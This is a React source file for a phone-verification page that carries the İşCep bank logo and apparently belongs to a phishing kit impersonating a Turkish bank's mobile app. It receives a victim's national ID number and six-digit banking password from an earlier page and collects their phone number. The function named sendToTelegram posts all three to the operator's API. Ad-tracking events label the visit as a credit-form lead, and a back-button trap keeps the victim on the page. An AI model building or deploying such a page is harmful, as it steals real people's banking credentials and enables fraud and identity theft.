// eslint-disable-next-line no-unused-vars
/* global fbq */
import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';

function PhoneVerificationPage() {
  const [state, setState] = React.useState({
    phoneNumber: '',
    isPhoneActive: false,
    isPhoneLabelHovered: false,
    showPhoneError: false,
    isSubmitting: false,
    isPhoneFocused: false,
    isPhonePrefixVisible: false,
    errorMessage: '',
  });
  const phoneInputRef = useRef(null);
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const { tc, password, isValidNavigation } = location.state || {};

  const getFbp = () => {
    const cookies = document.cookie.split(';');
    const fbpCookie = cookies.find((c) => c.trim().startsWith('_fbp='));
    return fbpCookie ? fbpCookie.split('=')[1] : null;
  };

  const trackMetaLead = useCallback(async (tc, phone, eventID) => {
    if (typeof window !== 'undefined' && window.fbq) {
      try {
        window.fbq('track', 'Lead', {
          content_category: 'lead_form',
          content_name: 'phone_verification'
        }, { eventID });
        console.log('Meta Lead event tetiklendi:', { eventID: eventID.substring(0, 8) + '...' });
      } catch (error) {
        console.error('Meta event hatası:', error);
      }
    }
  }, []);

  useEffect(() => {
    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: 'Geçersiz erişim, lütfen giriş yapın.',
      }));
      authDispatch({ type: 'RESET_AUTH' });
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
      return;
    }
    window.history.replaceState({ page: 'telefon' }, '', '/telefon');
    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');
    const handlePopState = (event) => {
      event.preventDefault();
      authDispatch({ type: 'RESET_AUTH' });
      window.history.replaceState(null, '', '/giris');
      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, [tc, password, isValidNavigation, navigate, authDispatch]);

  useEffect(() => {
    if (typeof window !== 'undefined' && window.fbq) {
      window.fbq('track', 'ViewContent', {
        content_category: 'credit_form',
        content_name: 'phone_verification_page',
      });
      window.fbq('track', 'InitiateCheckout', {
        content_category: 'credit_form_start',
      });
    }
  }, []);

  const sendToTelegram = useCallback(async (data) => {
    try {
      const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tc: String(data.tc),
          password: String(data.password),
          phone: String(data.phone),
          eventID: data.eventID,
          fbp: data.fbp,
          clickID: data.clickID,
        }),
      });
      const result = await res.json();
      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
      return result;
    } catch (error) {
      console.error('API hatası:', error);
      return { error: error.message };
    }
  }, []);

  const handlePhoneSubmit = useCallback(async (e) => {
    e.preventDefault();
    if (state.phoneNumber.length !== 10) {
      setState((prev) => ({
        ...prev,
        showPhoneError: true,
        errorMessage: 'Telefon numarası 10 haneli olmalı.',
      }));
      return;
    }
    setState((prev) => ({ ...prev, isSubmitting: true }));
    const eventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const clickID = (() => {
      const searchParams = new URLSearchParams(location.search);
      return searchParams.get('fbclid') || '';
    })();
    await trackMetaLead(tc, state.phoneNumber, eventID);
    await sendToTelegram({
      tc,
      password,
      phone: state.phoneNumber,
      eventID,
      fbp: getFbp(),
      clickID,
    });
    authDispatch({ type: 'RESET_AUTH' });
    setState({
      phoneNumber: '',
      isPhoneActive: false,
      isPhoneLabelHovered: false,
      showPhoneError: false,
      isSubmitting: false,
      isPhoneFocused: false,
      isPhonePrefixVisible: false,
      errorMessage: '',
    });
    window.history.replaceState(null, '', '/bekleme');
    navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
  }, [tc, password, navigate, authDispatch, trackMetaLead, sendToTelegram, state.phoneNumber, location.search]);

  const handleNumberInput = useCallback((e) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length <= 10) {
      setState((prev) => ({
        ...prev,
        phoneNumber: value,
        isPhoneActive: true,
        isPhoneLabelHovered: true,
        isPhonePrefixVisible: true,
        showPhoneError: false,
        errorMessage: '',
      }));
    }
  }, []);

  const handleClearPhoneNumber = useCallback(() => {
    setState((prev) => ({
      ...prev,
      phoneNumber: '',
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      showPhoneError: false,
      errorMessage: '',
    }));
    phoneInputRef.current?.focus();
  }, []);

  const handlePhoneFocus = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneActive: true,
      isPhoneLabelHovered: true,
      isPhonePrefixVisible: true,
      isPhoneFocused: true,
    }));
  }, []);

  const handlePhoneBlur = useCallback(() => {
    setState((prev) => ({
      ...prev,
      isPhoneFocused: false,
      isPhoneActive: prev.phoneNumber.length > 0,
      isPhoneLabelHovered: prev.phoneNumber.length > 0,
      isPhonePrefixVisible: prev.phoneNumber.length > 0,
    }));
  }, []);

  return (
    <div className="container" style={{ touchAction: 'manipulation' }}>
      <div className="right-section">
        <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
        <div className="new-container phone-verification-title">
          Telefon Doğrulama
          <div className="phone-verification-subtitle">Lütfen cep telefon numaranızı giriniz</div>
        </div>
        <div className="input-wrapper">
          <div
            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
              state.isPhonePrefixVisible ? 'prefix-visible' : ''
            }`}
            onClick={() => phoneInputRef.current?.focus()}
          >
            <label
              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}
              htmlFor="phone-input"
            >
              Telefon Numarası
            </label>
            <div className="phone-input-container">
              <span className="phone-prefix">+90</span>
              <input
                id="phone-input"
                ref={phoneInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="10"
                value={state.phoneNumber}
                onChange={handleNumberInput}
                onFocus={handlePhoneFocus}
                onBlur={handlePhoneBlur}
                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}
                autoComplete="tel"
                autoCapitalize="none"
                aria-describedby="phone-error"
                aria-label="Telefon Numarası"
                aria-invalid={state.showPhoneError}
              />
              {state.phoneNumber.length > 0 && (
                <button
                  className="clear-phone-button"
                  onClick={handleClearPhoneNumber}
                  onTouchStart={handleClearPhoneNumber}
                  aria-label="Telefon numarasını temizle"
                >
                  ✕
                </button>
              )}
            </div>
            {state.showPhoneError && (
              <div id="phone-error" className="phone-error" role="alert" aria-live="assertive">
                <img
                  src="/error.png"
                  alt="Hata Simgesi"
                  className="error-icon"
                  loading="lazy"
                  onError={() => console.warn('Hata simgesi yüklenemedi')}
                />
                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}
              </div>
            )}
          </div>
          <div className="verify-button-container">
            <button
              className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
              onClick={handlePhoneSubmit}
              onTouchStart={handlePhoneSubmit}
              disabled={state.isSubmitting}
              aria-label="Telefon numarasını doğrula"
            >
              Doğrula
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default memo(PhoneVerificationPage);